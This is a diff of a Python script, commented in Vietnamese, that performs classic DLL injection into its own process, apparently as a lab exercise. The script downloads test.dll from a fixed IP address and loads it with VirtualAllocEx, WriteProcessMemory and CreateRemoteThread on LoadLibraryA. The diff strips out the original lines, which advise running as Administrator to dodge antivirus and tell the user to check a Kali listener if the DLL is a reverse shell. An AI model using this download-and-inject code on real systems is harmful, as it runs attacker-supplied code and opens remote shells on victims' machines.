@@ -1,11 +1,3 @@
-"""
-Classic DLL Injection - Self-Injection (tiêm vào chính tiến trình đang chạy)
-Demo đầy đủ 4 bước injection pipeline nhưng inject vào chính mình,
-tránh hoàn toàn lỗi quyền truy cập cross-process.
-
-LƯU Ý: Chạy với quyền Administrator để tránh bị AV chặn.
-"""
-
 import os
 import sys
 import ctypes
@@ -54,67 +46,32 @@ kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
 kernel32.CloseHandle.restype = wintypes.BOOL
 kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
 
-# ==================== BƯỚC 1: LẤY HANDLE TIẾN TRÌNH HIỆN TẠI ====================
-print("[*] Bước 1: Lấy handle tiến trình hiện tại (self-injection)...")
+# Bước 1: Lấy handle tiến trình hiện tại
+hProcess = kernel32.GetCurrentProcess()
 
-pid = os.getpid()
-hProcess = kernel32.GetCurrentProcess()  # Trả về pseudo-handle -1, luôn có FULL ACCESS
-
-print(f"[+] PID tiến trình hiện tại: {pid}")
-print(f"[+] Handle: {hProcess}")
-
-# ==================== TẢI DLL TỪ MÁY CHỦ ====================
-print("[*] Đang tải DLL từ máy chủ...")
-
+# Tải DLL từ máy chủ
 url = "http://172.16.64.152/test.dll"
-destination = "test.dll"
-
-try:
-    urllib.request.urlretrieve(url, destination)
-    dll_path = os.path.abspath(destination)
-    print(f"[+] DLL đã lưu tại: {dll_path}")
-except Exception as e:
-    print(f"[-] Lỗi tải DLL: {e}")
-    sys.exit(1)
-
+urllib.request.urlretrieve(url, "test.dll")
+dll_path = os.path.abspath("test.dll")
 dll_bytes = dll_path.encode('utf-8') + b'\x00'
 
-# ==================== BƯỚC 2: CẤP PHÁT BỘ NHỚ ====================
-print("[*] Bước 2: Cấp phát bộ nhớ trong tiến trình...")
-
+# Bước 2: Cấp phát bộ nhớ
 addr = kernel32.VirtualAllocEx(
     hProcess, None, len(dll_bytes),
     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
 )
-if not addr:
-    print(f"[-] VirtualAllocEx thất bại. Lỗi: {ctypes.get_last_error()}")
-    sys.exit(1)
-print(f"[+] Đã cấp phát bộ nhớ tại: {hex(addr)}")
 
-# ==================== BƯỚC 3: GHI ĐƯỜNG DẪN DLL VÀO BỘ NHỚ ====================
-print("[*] Bước 3: Ghi đường dẫn DLL vào bộ nhớ...")
-
+# Bước 3: Ghi đường dẫn DLL vào bộ nhớ
 written = ctypes.c_size_t(0)
-result = kernel32.WriteProcessMemory(
+kernel32.WriteProcessMemory(
     hProcess, ctypes.c_void_p(addr),
     dll_bytes, len(dll_bytes),
     ctypes.byref(written)
 )
-if not result:
-    print(f"[-] WriteProcessMemory thất bại. Lỗi: {ctypes.get_last_error()}")
-    sys.exit(1)
-print(f"[+] Đã ghi {written.value} bytes.")
 
-# ==================== BƯỚC 4: TẠO LUỒNG THỰC THI ====================
-print("[*] Bước 4: Phân giải LoadLibraryA và tạo luồng...")
-
+# Bước 4: Phân giải LoadLibraryA và tạo luồng thực thi
 h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
 load_lib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
-
-if not load_lib_addr:
-    print(f"[-] GetProcAddress thất bại. Lỗi: {ctypes.get_last_error()}")
-    sys.exit(1)
-print(f"[+] Địa chỉ LoadLibraryA: {hex(load_lib_addr)}")
 
 thread_id = wintypes.DWORD(0)
 hThread = kernel32.CreateRemoteThread(
@@ -124,16 +81,9 @@ hThread = kernel32.CreateRemoteThread(
     0, ctypes.byref(thread_id)
 )
 
-if not hThread:
-    err = ctypes.get_last_error()
-    print(f"[-] CreateRemoteThread thất bại. Lỗi: {err}")
-    sys.exit(1)
-
-print(f"[+] Inject thành công! Thread ID: {thread_id.value}")
-
-# Chờ DLL nạp xong
-kernel32.WaitForSingleObject(hThread, 10000)
-kernel32.CloseHandle(hThread)
-
-print("[+] Hoàn tất thực nghiệm Classic DLL Injection (self-injection).")
-print("[+] Nếu DLL là reverse shell, kiểm tra listener trên Kali.")
+if hThread:
+    print(f"[+] Inject thành công!")
+    kernel32.WaitForSingleObject(hThread, 10000)
+    kernel32.CloseHandle(hThread)
+else:
+    print(f"[-] Inject thất bại. Lỗi: {ctypes.get_last_error()}")
